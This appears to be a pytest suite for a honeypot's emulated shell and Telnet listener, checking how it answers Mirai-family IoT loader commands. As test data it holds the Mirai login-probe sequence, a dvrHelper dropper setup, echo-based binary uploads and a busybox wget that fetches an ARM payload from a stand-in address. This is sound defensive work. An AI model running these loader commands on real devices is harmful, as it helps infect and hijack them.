"""The deterministic shell against what IoT loaders send: the Mirai-family opener, command
lists with short-circuit, busybox applets and their usage, the ELF image of a program file
read every way a loader reads one, scratch files within a session, the bytes the Telnet
listener puts on the wire, the event log and the console's view of empty replies."""

from __future__ import annotations

import asyncio
import json
import re
import struct
import time

import pytest

from agents import busybox_text, elfimage, hooks, shell
from agents.budget import Budget, BudgetConfig
from listeners import telnet
from listeners.base import Conn, ListenerContext, ServiceSettings
from listeners.events import EventWriter, clean
from scenarios.schema import Hardware, LoginPolicy

NOW = 1_795_000_000.0
UBUNTU_24 = ("Linux app01 6.8.0-45-generic #45-Ubuntu SMP PREEMPT_DYNAMIC Fri Aug 30 12:02:04 "
             "UTC 2024 {m} {m} {m} GNU/Linux")


def host(machine: str = "x86_64", os_name: str = "Ubuntu 24.04.1 LTS") -> shell.Host:
    return shell.Host(hostname="app01", kernel=UBUNTU_24.format(m=machine),
                      os_pretty_name=os_name, seed="fixture-seed",
                      hardware=Hardware(cpus=2, memory_mb=2048))


def run(lines, h=None, session=None, **kw):
    """Each line's reply from one canned-shell session, as root in /root."""
    h = h or host()
    session = session if session is not None else shell.Session()
    kw.setdefault("now", NOW)
    return [shell.reply(h, line, user="root", interactive=True, cwd="/root", session=session,
                        **kw) for line in lines]


def one(line, h=None, **kw):
    return run([line], h, **kw)[0]


def wire(text: str) -> bytes:
    return shell.wire(text)


def image(h: shell.Host, program: str) -> bytes:
    return elfimage.image(h.machine, h.rng("elf", program))


@pytest.fixture(autouse=True)
def reset_hooks():
    hooks.reset()
    yield
    hooks.reset()


# ---- the brief's table, row by row ----------------------------------------------------------

def test_openers_bash_does_not_know_are_command_not_found():
    assert one("sh") == ""
    for word in ("shell", "system", "linuxshell"):
        assert one(word) == f"-bash: {word}: command not found\n"
    # enable stays bash's builtin listing
    assert one("enable").startswith("enable .\nenable :\n")


def test_ping_and_nc_without_arguments_print_their_usage():
    assert one("ping") == "ping: usage error: Destination address required\n"
    assert one("nc").startswith("usage: nc [-46CDdFhklNnrStUuvZz] [-I length]")
    rocky = host(os_name="Rocky Linux 9.4 (Blue Onyx)")
    assert one("nc", rocky) == "Ncat: You must specify a host to connect to. QUITTING.\n"
    a = shell.answer(host(), "ping", now=NOW)
    assert a.status == 1 and a.scope == shell.FIXED


def test_a_semicolon_glued_to_a_word_ends_it():
    assert one("ping; sh") == "ping: usage error: Destination address required\n"
    assert one("ping;sh") == one("ping; sh")
    assert one("frobnicate;sh") == "-bash: frobnicate: command not found\n"


def test_busybox_cat_of_its_own_exe_or_cat():
    h = host()
    out = wire(one("/bin/busybox cat /proc/self/exe || cat /proc/self/exe", h))
    assert out == image(h, "busybox")           # || stops after busybox succeeds
    assert out.count(b"\x7fELF") == 1


@pytest.mark.parametrize("line,program", [("cat /proc/self/exe", "cat"),
                                          ("cat /bin/echo", "echo"),
                                          ("cat /bin/busybox", "busybox"),
                                          ("cat /usr/bin/echo", "echo")])
def test_program_files_read_as_an_elf_image_for_the_host(line, program):
    h = host()
    out = wire(one(line, h))
    assert out == image(h, program)
    assert out[:4] == b"\x7fELF" and out[4] == 2 and out[5] == 1
    assert struct.unpack_from("<H", out, 18)[0] == 62


@pytest.mark.parametrize("machine,em,cls", [("x86_64", 62, 2), ("aarch64", 183, 2),
                                            ("i686", 3, 1), ("armv7l", 40, 1)])
def test_the_machine_field_follows_uname_m(machine, em, cls):
    h = host(machine)
    assert one("uname -m", h) == machine + "\n"
    out = wire(one("cat /bin/echo", h))
    assert out[4] == cls and out[5] == 1 and struct.unpack_from("<H", out, 18)[0] == em
    # the header has nothing a terminal or Telnet would rewrite
    header = out[:64 if cls == 2 else 52]
    assert not set(header) & {0x0A, 0x0D, 0xFF}


def test_every_way_of_reading_a_program_file_agrees():
    h = host()
    full = wire(one("cat /bin/echo", h))
    assert wire(one("/bin/busybox cat /bin/echo", h)) == full
    dd = wire(one("dd if=/bin/echo 2>/dev/null", h))
    assert dd == full
    assert wire(one("dd bs=52 count=1 if=/bin/echo 2>/dev/null", h)) == full[:52]
    assert wire(one("dd if=/bin/echo bs=4 skip=4 count=1 2>/dev/null", h)) == full[16:20]
    # the read loop: NULs dropped, lines split at 0x0a, words joined by one space
    looped = wire(one("while read -r i; do echo $i; done < /bin/echo", h))
    assert looped.startswith(b"\x7fELF\x02\x01\x01\x03>")
    lines = [line.replace(b"\x00", b"") for line in full.split(b"\n")[:-1]]
    assert looped == b"".join(b" ".join(w for w in re.split(rb"[ \t]+", line) if w) + b"\n"
                              for line in lines)
    assert wire(one("while read i; do echo $i; done < /bin/echo", h)).startswith(
        b"\x7fELF\x02\x01\x01\x03>")


def test_the_read_loop_follows_bash_read_and_echo():
    session = shell.Session()
    out = run(["echo -ne 'a\\x00b\\\\c  d\\x0b e\\n-n x\\nlast' > /tmp/r",
               "while read i; do echo $i; done < /tmp/r",
               "while read -r i; do echo $i; done < /tmp/r"], session=session)
    assert out[1] == "abc d\x0b e\nx"                  # -n read as echo's option
    assert out[2] == "ab\\c d\x0b e\nx"


def test_busybox_wget_tftp_and_a_marker():
    out = one("/bin/busybox wget; /bin/busybox tftp; /bin/busybox ECCHI")
    version = host().busybox
    assert out.startswith(f"BusyBox v{version} multi-call binary.\n\nUsage: wget [-cqS]")
    assert f"BusyBox v{version} multi-call binary.\n\nUsage: tftp [OPTIONS] HOST [PORT]" in out
    assert out.endswith("ECCHI: applet not found\n")


def test_the_scratch_file_sequence_is_silent_and_remembered():
    session = shell.Session()
    out = run(["cd /tmp; /bin/busybox cp /bin/echo x; >x; chmod 777 x", "pwd", "ls -l x",
               "cat x", "./x"], session=session)
    assert out[0] == "" and out[1] == "/tmp\n"
    assert re.fullmatch(r"-rwxrwxrwx 1 root root 0 \w{3} [ \d]\d \d\d:\d\d x\n", out[2])
    assert out[3] == "" and out[4] == ""            # an empty file runs as an empty script
    entry = session.files["/tmp/x"]
    assert entry.data == "" and entry.mode == 0o777 and session.cwd == "/tmp"


def test_dd_of_a_binary_or_cat_prints_the_header_then_the_counts():
    h = host()
    out = one("/bin/busybox dd bs=52 count=1 if=/bin/echo || cat /bin/echo", h)
    assert wire(out) == image(h, "echo")[:52] + b"1+0 records in\n1+0 records out\n"
    gnu = one("dd bs=52 count=1 if=/bin/echo", h)
    assert re.fullmatch(r"1\+0 records in\n1\+0 records out\n52 bytes copied, "
                        r"[0-9.e-]+ s, [0-9.]+ [kMG]?B/s\n", gnu[52:])
    assert run(["touch /tmp/gone; rm /tmp/gone", "dd if=/tmp/gone bs=52 count=1"], h)[1] == \
        "dd: failed to open '/tmp/gone': No such file or directory\n"


def test_rm_then_echo_keeps_the_echo():
    assert one("rm -rf x; echo done") == "done\n"
    assert run(["cd /tmp; touch x", "rm -rf x; echo done", "cat x"]) == \
        ["", "done\n", "cat: x: No such file or directory\n"]


def test_the_read_loop_over_proc_self_exe_is_the_shells_image():
    h = host()
    out = wire(one("while read i; do echo $i; done < /proc/self/exe", h))
    assert out.startswith(b"\x7fELF\x02\x01\x01\x03>")
    assert out != wire(one("while read i; do echo $i; done < /bin/echo", h))


def test_ls_of_the_bin_dirs_agrees_with_the_commands():
    h = host()
    listing = one("ls -1 /bin", h).split()
    assert one("ls -1 /usr/bin", h).split() == listing
    for name in ("busybox", "cat", "echo", "wget", "ping", "nc", "dd", "cp", "chmod", "uname",
                 "lspci", "curl"):
        assert name in listing, name
    for name in ("shell", "system", "linuxshell", "nvidia-smi", "killall"):
        assert name not in listing, name
    assert "sshd" in one("ls -1 /sbin", h).split()
    assert "useradd" in one("ls -1 /usr/sbin", h).split()
    rhel = host(os_name="Rocky Linux 9.4 (Blue Onyx)")
    assert "busybox" not in one("ls -1 /bin", rhel).split()
    assert one("/bin/busybox", rhel) == "-bash: /bin/busybox: No such file or directory\n"


# ---- command lists and short-circuit ----------------------------------------------------------

@pytest.mark.parametrize("line,expected", [
    ("true && echo a || echo b", "a\n"),
    ("false && echo a || echo b", "b\n"),
    ("false || false || echo c", "c\n"),
    ("true || echo a; echo b", "b\n"),
    ("false && echo a; echo b", "b\n"),
    ("frobnicate && echo a", "-bash: frobnicate: command not found\n"),
    ("frobnicate || echo a", "-bash: frobnicate: command not found\na\n"),
    ("cat /tmp/nope || echo fallback", "cat: /tmp/nope: No such file or directory\nfallback\n"),
    ("/bin/busybox ECCHI || echo x", "ECCHI: applet not found\nx\n"),
])
def test_short_circuit_follows_exit_status(line, expected):
    assert one(line) == expected


def test_a_part_we_cannot_evaluate_does_not_lose_the_rest():
    # answer() still refuses the whole line (the model path); reply() answers part by part
    assert shell.answer(host(), "uname -m; frobnicate; uname -s", now=NOW) is None
    assert one("uname -m; frobnicate; uname -s") == \
        "x86_64\n-bash: frobnicate: command not found\nLinux\n"
    assert one("ls --color /tmp; echo after") == "after\n"
    assert one("ls /tmp/*; echo after") == ""      # a glob: the whole line needs a shell


def test_answer_scopes_for_the_model_path():
    h = host()
    for line in ("cat /proc/self/exe", "cat /bin/echo", "/bin/busybox ECCHI", "ping", "nc",
                 "dd bs=52 count=1 if=/bin/echo"):
        assert shell.answer(h, line, now=NOW).scope == shell.FIXED, line
    for line in ("cd /tmp; >x", "cp /bin/echo /tmp/x", "echo -ne '\\x41' >> /tmp/x"):
        assert shell.answer(h, line, now=NOW).scope == shell.STATE, line


# ---- busybox ----------------------------------------------------------------------------------

USAGE_APPLETS = ("wget", "tftp", "cp", "chmod", "rm", "mkdir", "mv", "touch", "printf", "nc",
                 "ftpget", "ftpput")


@pytest.mark.parametrize("os_name,generation", [("Ubuntu 22.04.4 LTS", "1.30"),
                                                ("Ubuntu 24.04.1 LTS", "1.36"),
                                                ("Debian GNU/Linux 12 (bookworm)", "1.35")])
def test_busybox_applets_print_the_packages_usage(os_name, generation):
    h = host(os_name=os_name)
    for applet in USAGE_APPLETS:
        a = shell.answer(h, f"/bin/busybox {applet}", now=NOW)
        assert a.status == 1, applet
        assert a.output == (f"BusyBox v{h.busybox} multi-call binary.\n\n"
                            + busybox_text.USAGE[generation][applet]), applet
    assert one("/bin/busybox echo", h) == "\n"
    for applet in ("kill", "killall"):
        a = shell.answer(h, f"/bin/busybox {applet}", now=NOW)
        assert (a.output, a.status) == (f"{applet}: you need to specify whom to kill\n", 1)
    listed = one("/bin/busybox --list", h).split()
    assert listed == sorted(busybox_text.APPLETS[generation])
    # what busybox runs here is what that package has
    for applet in shell._APPLETS:
        assert applet in busybox_text.APPLETS[generation], applet
    assert one("/bin/busybox cd /tmp", h) == "cd: applet not found\n"
    assert one("/bin/busybox MIRAI", h) == "MIRAI: applet not found\n"


def test_gnu_tools_without_operands_say_what_is_missing():
    assert one("cp") == "cp: missing file operand\nTry 'cp --help' for more information.\n"
    assert one("cp x") == ("cp: missing destination file operand after 'x'\n"
                           "Try 'cp --help' for more information.\n")
    assert one("rm") == "rm: missing operand\nTry 'rm --help' for more information.\n"
    assert one("rm -f") == ""
    assert one("chmod 777") == ("chmod: missing operand after '777'\n"
                                "Try 'chmod --help' for more information.\n")
    assert one("kill") == ("kill: usage: kill [-s sigspec | -n signum | -sigspec] pid | "
                           "jobspec ... or kill -l [sigspec]\n")
    assert one("printf") == "printf: usage: printf [-v var] format [arguments]\n"
    assert one("printf 'a%sb\\n' x") == "axb\n"


def test_busybox_wget_with_a_url_uses_busybox_wording():
    assert one("/bin/busybox wget http://203.0.113.5/bins/x.arm7 -O - > x") == (
        "Connecting to 203.0.113.5:80 (203.0.113.5:80)\n"
        "wget: can't connect to remote host (203.0.113.5): Network is unreachable\n")
    assert one("busybox wget http://bad.example/x") == "wget: bad address 'bad.example'\n"


# ---- scratch files ----------------------------------------------------------------------------

def test_an_echo_upload_is_kept_byte_for_byte_and_executes_as_the_kernel_would():
    session = shell.Session()
    arm = "\\x7f\\x45\\x4c\\x46\\x01\\x01\\x01\\x00" + "\\x00" * 8 + "\\x02\\x00\\x28\\x00"
    out = run(["cd /tmp", f"echo -ne '{arm}' > dvrHelper", "echo -ne '\\xff\\x80' >> dvrHelper",
               "chmod 777 dvrHelper", "./dvrHelper", "ls -la"], session=session)
    data = wire(session.files["/tmp/dvrHelper"].data)
    assert data == b"\x7fELF\x01\x01\x01\x00" + bytes(8) + b"\x02\x00\x28\x00\xff\x80"
    assert out[4] == "-bash: ./dvrHelper: cannot execute binary file: Exec format error\n"
    assert re.search(r"\n-rwxrwxrwx +1 root root +22 \w{3} [ \d]\d \d\d:\d\d dvrHelper\n", out[5])
    assert out[5].startswith("total ") and " .\n" in out[5] and " .X11-unix\n" in out[5]


def test_a_program_for_this_machine_is_never_run():
    h = host()
    session = shell.Session()
    header = "".join(f"\\x{b:02x}" for b in image(h, "echo")[:20])
    out = run([f"echo -ne '{header}' > /tmp/d", "chmod +x /tmp/d", "/tmp/d; echo next"],
              h, session)
    assert out[2] == "next\n"


def test_a_copied_program_answers_as_that_program():
    out = run(["cp /bin/echo /tmp/e", "/tmp/e hello", "chmod 644 /tmp/e", "/tmp/e"])
    assert out[1] == "hello\n" and out[3] == "-bash: /tmp/e: Permission denied\n"


def test_mkdir_mv_touch_and_cd_stay_consistent():
    out = run(["mkdir /tmp/.d", "cd /tmp/.d", "touch a", "mv a b", "ls", "mkdir /tmp/.d",
               "cd /", "rm /tmp/.d", "rm -r /tmp/.d; ls -a /tmp/.d"])
    assert out[:4] == ["", "", "", ""] and out[4] == "b\n"
    assert out[5] == "mkdir: cannot create directory '/tmp/.d': File exists\n"
    assert out[7] == "rm: cannot remove '/tmp/.d': Is a directory\n"
    assert out[8] == ""                       # the listing of a removed dir is unknown


def test_files_are_only_made_where_a_listing_is_known():
    assert shell.answer(host(), "echo x > /etc/motd", now=NOW) is None
    assert shell.answer(host(), "cp /bin/echo /etc/x", now=NOW) is None
    assert shell.answer(host(), "rm /etc/passwd", now=NOW) is None
    a = shell.answer(host(), "echo x > /tmp/f", user="alice", now=NOW)
    assert a is not None and a.output == ""
    denied = shell.answer(host(), "echo x > /opt/f", user="alice", now=NOW)
    assert denied.output == "-bash: /opt/f: Permission denied\n" and denied.status == 1


def test_echo_to_the_terminal_still_drops_control_bytes():
    assert one("echo -e 'a\\x07b\\x1bc'") == "abc\n"


# ---- budgets ----------------------------------------------------------------------------------

def test_a_hostile_long_list_stays_within_the_budget():
    h = host()
    started = time.perf_counter()
    assert one("a;" * 2000, h) == "-bash: a: command not found\n"       # over MAX_LIST
    out = one(";".join(["a"] * shell.MAX_LIST), h)
    assert out == "-bash: a: command not found\n" * shell.MAX_LIST
    heavy = host()
    heavy.hardware = Hardware(cpus=64, memory_mb=2048)
    line = "; ".join(["cat /proc/cpuinfo"] * shell.MAX_LIST)
    assert shell.answer(heavy, line, now=NOW) is None                  # MAX_OUTPUT
    assert len(one(line, heavy)) < shell.MAX_OUTPUT
    session = shell.Session()
    run(["echo -ne '" + "a b\\n" * 200 + "' >> /tmp/big"] * 170, h, session)
    assert 100_000 < session.size() <= shell.MAX_SCRATCH_BYTES
    loops = "; ".join(["while read i; do echo $i; done < /tmp/big"] * 4)
    assert shell.Shell(h, "root", True, "/root", NOW, None, session).run(loops) is None
    assert one(loops, h, session=session) == ""                         # MAX_WORK
    assert time.perf_counter() - started < 2.0


def test_session_files_are_bounded():
    session = shell.Session()
    run([f"touch /tmp/f{n}" for n in range(shell.MAX_SCRATCH + 10)], session=session)
    assert len(session.files) == shell.MAX_SCRATCH
    chunk = "\\x41" * 1000
    run([f"echo -ne '{chunk}' >> /tmp/f0"] * 400, session=session)
    assert session.size() <= shell.MAX_SCRATCH_BYTES
    run([f"rm /tmp/f{n}; touch /tmp/g{n}; rm /tmp/g{n}" for n in range(100)], session=session)
    assert len(session.removed) <= shell.MAX_SCRATCH


# ---- bytes on the wire and in the log ---------------------------------------------------------

def test_printable_and_wire():
    text = shell.binary_text(b"\x7fELF\x02\xff\x80ok\r\n\t")
    assert wire(text) == b"\x7fELF\x02\xff\x80ok\r\n\t"
    assert shell.printable(text) == "\\x7fELF\\x02\\xff\\x80ok\r\n\t"
    assert shell.printable("plain é text") == "plain é text"


class FakeWriter:
    """A connection's writer: keeps every write as sent."""

    def __init__(self) -> None:
        self.writes: list[bytes] = []

    def write(self, data: bytes) -> None:
        self.writes.append(bytes(data))

    async def drain(self) -> None:
        return None

    def get_extra_info(self, name):
        return {"peername": ("203.0.113.7", 40000), "sockname": ("192.0.2.1", 23)}.get(name)

    def close(self) -> None:
        return None


MIRAI_OPENER = [
    "enable", "system", "shell", "sh", "linuxshell", "ping; sh",
    "/bin/busybox ECCHI",
    "/bin/busybox ps; /bin/busybox ECCHI",
    "/bin/busybox cat /proc/mounts; /bin/busybox ECCHI",
    "/bin/busybox echo -e '\\x6b\\x61\\x6d\\x69' > /tmp/.nippon; /bin/busybox cat /tmp/.nippon; "
    "/bin/busybox rm /tmp/.nippon",
    "cd /tmp/; /bin/busybox cp /bin/echo dvrHelper; >dvrHelper; /bin/busybox chmod 777 "
    "dvrHelper; /bin/busybox ECCHI",
    "/bin/busybox cat /proc/self/exe || cat /proc/self/exe",
    "/bin/busybox dd bs=52 count=1 if=/bin/echo || while read i; do echo $i; done < /bin/echo",
    "cat /bin/echo",
    "/bin/busybox wget; /bin/busybox tftp; /bin/busybox ECCHI",
]


async def test_the_mirai_opener_end_to_end_through_the_telnet_listener():
    events = EventWriter(None)
    ctx = ListenerContext(events, bind_host="127.0.0.1", seed="test")
    ctx.settings["telnet"] = ServiceSettings(name="telnet", enabled=True, port=0,
                                             policy=LoginPolicy(accept="all"))
    reader = asyncio.StreamReader()
    reader.feed_data("".join(line + "\r\n" for line in MIRAI_OPENER).encode())
    reader.feed_eof()
    writer = FakeWriter()
    conn = Conn(ctx, "telnet", reader, writer)
    try:
        await telnet._canned_session(conn, telnet.TelnetReader(conn), "root")
    except Exception as exc:                       # the fake connection ends with EOF
        assert type(exc).__name__ == "ConnClosed"
    h = shell.host_for(None, "test")
    sent = writer.writes
    at = [i for i, w in enumerate(sent) if w.startswith(b"root@srv01:")]
    prompts = [sent[i] for i in at]
    replies = [sent[i + 1] for i in at[:-1]]
    assert len(replies) == len(MIRAI_OPENER)
    assert replies[1] == b"-bash: system: command not found\r\n"
    assert replies[3] == b""
    assert replies[5] == b"ping: usage error: Destination address required\r\n"
    assert replies[6] == b"ECCHI: applet not found\r\n"
    assert replies[9] == b"kami\r\n"
    assert replies[10] == b"ECCHI: applet not found\r\n"
    assert prompts[11] == b"root@srv01:/tmp# "           # the session moved to /tmp

    def as_telnet(data: bytes) -> bytes:                # ONLCR, then IAC doubled
        return data.replace(b"\n", b"\r\n").replace(b"\xff", b"\xff\xff")

    busybox = image(h, "busybox")
    assert replies[11] == as_telnet(busybox)
    assert replies[11][:4] == b"\x7fELF" and replies[11][18:20] == b"\x3e\x00"
    echo = image(h, "echo")
    assert replies[12] == echo[:52] + b"1+0 records in\r\n1+0 records out\r\n"
    assert replies[13] == as_telnet(echo)
    assert b"\xff\xff" in replies[13] or b"\xff" not in echo
    assert replies[14].endswith(b"ECCHI: applet not found\r\n")
    # the event log keeps printable text, capped as before
    logged = [e for e in events.events if e["event"] == "command"]
    assert [e["data"]["input"] for e in logged] == [clean(line) for line in MIRAI_OPENER]
    for e in logged:
        response = e["data"]["response"]
        assert all(c.isprintable() or c in "\r\n\t" for c in response)
        assert len(response) <= telnet.RESPONSE_LOG_CAP
        json.dumps(e).encode("utf-8")
    assert logged[3]["data"]["response"] == ""
    # binary bytes are logged as \xNN text, which the log's own escaping writes as \\xNN
    response = logged[11]["data"]["response"]
    assert response.startswith("\\\\x7fELF\\\\x02\\\\x01\\\\x01")
    from agents.ui.activity import describe

    shown = describe({"event": "command", "data": logged[11]["data"]}, "telnet", "input", 4000)
    assert shown["answered"].startswith("\\x7fELF\\x02\\x01\\x01\\x00")


async def test_a_binary_answer_on_the_model_path_keeps_history_text():
    """A local answer that holds binary bytes goes out as bytes, and what the model is shown
    later is printable text."""
    from langchain_core.chat_history import InMemoryChatMessageHistory

    class History:
        def __init__(self):
            self.store = {}
            self.calls = []

        def get_session_history(self, sid):
            return self.store.setdefault(sid, InMemoryChatMessageHistory())

        async def ainvoke(self, payload, config=None):
            self.calls.append(payload["messages"][-1].content)
            return type("R", (), {"content": "ok\r\nroot@srv01:~# "})()

    hooks.set_budget(Budget(BudgetConfig()))
    history = History()
    r = await hooks.persona_invoke(history, session_id="s1", src_ip="203.0.113.9",
                                   username="root", text="cat /proc/self/exe", interactive=True,
                                   llm_config={"configurable": {"session_id": "s1"}})
    assert getattr(r, "local_reply", False) and wire(r.content).startswith(b"\x7fELF")
    kept = history.store["s1"].messages[1].content
    assert kept.startswith("\\x7fELF") and kept.encode("utf-8")
    assert hooks.clip_input("a\udcffb") == "a?b"


# ---- the console: empty reply, no reply, line endings ------------------------------------------

def test_activity_tells_an_empty_reply_from_none_and_shows_line_breaks():
    from agents.ui.activity import describe

    def telnet_line(data):
        return {"event": "command", "sensor_protocol": "telnet",
                "data": {k: clean(v) for k, v in data.items()}}

    empty = describe(telnet_line({"input": "sh", "response": ""}), "telnet", "input", 4000)
    assert empty["answered"] == "" and empty["sent"] == "sh"
    none = describe(telnet_line({"input": "uname"}), "telnet", "input", 4000)
    assert none["answered"] is None
    blank = describe(telnet_line({"input": "", "response": ""}), "telnet", "input", 4000)
    assert blank["sent"] == "" and blank["answered"] == ""
    crlf = describe(telnet_line({"input": "x", "response": "kami\r\nroot\\x0a\r\n"}),
                    "telnet", "input", 4000)
    # line endings become line breaks; a backslash the reply held stays text
    assert crlf["answered"] == "kami\nroot\\x0a\n"
    binary = describe(telnet_line({"input": "x", "response": telnet._logged(
        shell.binary_text(b"\x7fELF\x01\r\n"))}), "telnet", "input", 4000)
    assert binary["answered"] == "\\x7fELF\\x01\n"


def test_console_item_keeps_the_empty_reply(tmp_path):
    from ui_fixture import build_tree

    from agents.ui.api import Api

    tree = build_tree(tmp_path / "tree")
    lines = [{"timestamp": "2026-11-18T09:00:00.000+00:00", "task_name": "telnet-e",
              "src_ip": "198.51.100.30", "src_port": 4, "dst_ip": "10.0.0.5", "dst_port": 23,
              "message": "Telnet input", "sensor_protocol": "telnet", "event": "command",
              "transport": "tcp", "data": data}
             for data in ({"input": "sh", "response": ""}, {"input": "uname"},
                          {"input": "", "response": ""},
                          {"input": "id", "response": clean("uid=0(root)\r\n")})]
    with open(tree.log, "w", encoding="utf-8") as f:
        for line in lines:
            f.write(json.dumps(line) + "\n")
    status, body = Api(tree.api_paths(), cache_seconds=0).get(
        "/api/activity", {"session": "telnet-e"})
    assert status == 200
    got = {i["sent"]: i["answered"] for i in body["items"]}
    assert got == {"sh": "", "uname": None, "": "", "id": "uid=0(root)\n"}


def test_event_detail_renders_the_three_cases_as_text_nodes():
    from pathlib import Path

    js = (Path(__file__).resolve().parents[1] / "agents/ui/static/app.js").read_text()
    start = js.index("\n  function eventDetail(")
    body = js[start:js.index("\n  function ", start + 10)]
    assert '"Answered with nothing."' in body
    assert '"No reply is recorded in the log for this event."' in body
    assert '"(empty line)"' in body
    # the empty-reply branch comes before the no-reply one, and only "string" counts
    assert body.index('typeof it.answered === "string") {') < body.index("No reply is recorded")
    assert "innerHTML" not in body and "insertAdjacent" not in body


def test_found_by_fuzzing():
    # wc -c counts the bytes of a binary; ls -l of an empty directory is just its total
    assert one("cat /bin/echo | wc -c") == f"{elfimage.SIZE}\n"
    assert one("ls -l /mnt") == "total 0\n"


def test_found_in_review():
    h = host()
    a = shell.answer(h, "echo hi > /tmp/a > /tmp", now=NOW)
    assert a.output == "-bash: /tmp: Is a directory\n" and a.scope == shell.STATE
    assert one("echo hi 1>&2 | wc -c") == "hi\n0\n"
    session = shell.Session()
    run(["echo -ne '\\xde\\xad\\xbe\\xef' | cat > /tmp/p"], session=session)
    assert wire(session.files["/tmp/p"].data) == b"\xde\xad\xbe\xef"
    out = [shell.reply(h, line, user="alice", cwd="/tmp", now=NOW, session=session)
           for line in ("touch /tmp/x", "chmod u+x /tmp/x", "/tmp/x")]
    assert out == ["", "", ""]
    assert run(["cp /bin/echo /usr/local/bin/x", "/usr/local/bin/x hi"])[1] == "hi\n"
    assert run(["echo é > /tmp/u", "dd if=/tmp/u bs=1 count=1 2>/dev/null | wc -c"])[1] == "1\n"
    assert shell.answer(h, "mkdir -p /tmp/a/b/c/d/e/f/g/h/i", now=NOW) is None


# ---- output the shell cannot evaluate still follows its redirections --------------------------

def test_fallback_output_goes_where_its_redirections_point():
    session = shell.Session(cwd="/root")
    assert run(["printf hi > /tmp/x", "cat /tmp/x"], session=session) == ["", "hi"]
    assert run(["printf yo >> /tmp/x", "cat /tmp/x"], session=session) == ["", "hiyo"]
    assert run(["printf a > /dev/null", "printf b >&2", "printf c 2>/dev/null >&2",
                "printf d 2>&1"]) == ["", "b", "", "d"]
    # the missing file's error is the tool's own, sent to /dev/null; the list goes on
    assert one("cat /tmp/nope 2>/dev/null; echo marker") == "marker\n"
    assert one("foo 2>/dev/null; echo marker") == "marker\n"
    assert one("foo > /dev/null 2>&1") == ""
    assert one("foo 2>&1 > /dev/null") == "-bash: foo: command not found\n"
    assert run(["foo 2>/tmp/e", "cat /tmp/e"]) == ["", "-bash: foo: command not found\n"]
    # a target this shell cannot write: the output is not shown instead
    assert one("printf hi > /etc/passwd") == ""


def test_fallback_in_a_pipeline_answers_each_stage_through_its_own_redirections():
    assert one("printf hi | foo") == "-bash: foo: command not found\n"
    assert one("printf hi | foo 2>/dev/null") == ""
    assert one("foo | bar 2>/dev/null") == "-bash: foo: command not found\n"
    assert one("foo | echo hi") == "-bash: foo: command not found\nhi\n"
    # the last stage's status decides && and ||
    assert one("printf hi | foo && echo ok") == "-bash: foo: command not found\n"
    assert one("foo 2>/dev/null | cat || echo no") == ""
    # every stage still opens its files, and output into a pipe is not shown
    session = shell.Session(cwd="/root")
    assert run(["foo 2>/dev/null | cat > /tmp/q", "ls /tmp/q"], session=session) \
        == ["", "/tmp/q\n"]
    assert run(["printf hi > /tmp/p | cat", "cat /tmp/p"], session=session) == ["", "hi"]
    assert one("printf hi 2>&1 | foo 2>/dev/null") == ""
    assert one("foo | cat > /root") == ("-bash: foo: command not found\n"
                                        "-bash: /root: Is a directory\n")


def test_busybox_printf_and_a_read_loop_follow_their_redirections():
    session = shell.Session(cwd="/root")
    assert run(["busybox printf hi > /tmp/y", "cat /tmp/y"], session=session) == ["", "hi"]
    # a read loop with nothing to read cannot be answered, but its file is still made
    assert run(["while read i; do echo $i; done > /tmp/l", "ls /tmp/l"],
               session=session) == ["", "/tmp/l\n"]


def test_a_redirection_error_goes_where_fd_2_points_by_then():
    session = shell.Session(cwd="/root")
    run(["touch /tmp/f", "rm /tmp/f"], session=session)
    assert run(["cat 2>/dev/null < /tmp/f"], session=session) == [""]
    assert run(["cat < /tmp/f 2>/dev/null"], session=session) \
        == ["-bash: /tmp/f: No such file or directory\n"]
    assert run(["echo hi 2>/tmp/e > /root", "cat /tmp/e"], session=session) \
        == ["", "-bash: /root: Is a directory\n"]
    assert one("foo 2>/dev/null > /root") == ""


def test_a_line_that_cannot_be_parsed_keeps_its_stderr_redirections():
    assert one("foo $X") == "-bash: foo: command not found\n"
    assert one("foo $X 2>/dev/null") == ""
    assert one("foo $X >/dev/null 2>&1") == ""
    assert one("foo $X &>/dev/null") == ""
    assert one("foo $X 2>&1 >/dev/null") == "-bash: foo: command not found\n"
    assert one("foo '2>/dev/null' $X") == "-bash: foo: command not found\n"
    # only the first command's redirections count
    assert one("foo $X; bar 2>/dev/null") == "-bash: foo: command not found\n"
    assert one("foo $X | bar 2>/dev/null") == "-bash: foo: command not found\n"


def test_redirected_fallback_output_stays_within_the_session_limits():
    session = shell.Session(cwd="/root")
    word = "A" * 1000
    line = "; ".join([f"printf {word} >> /tmp/big"] * 3)
    replies = run([line] * 60, session=session)
    assert session.size() <= shell.MAX_SCRATCH_BYTES
    assert len(session.files["/tmp/big"].data) > shell.MAX_SCRATCH_BYTES - 3000
    assert all(r == "" for r in replies)


def test_a_copied_program_reads_its_input():
    out = run(["cp /bin/cat /tmp/c", "echo hello | /tmp/c", "echo data > /tmp/in",
               "/tmp/c < /tmp/in"])
    assert out[1] == "hello\n"
    assert out[3] == "data\n"
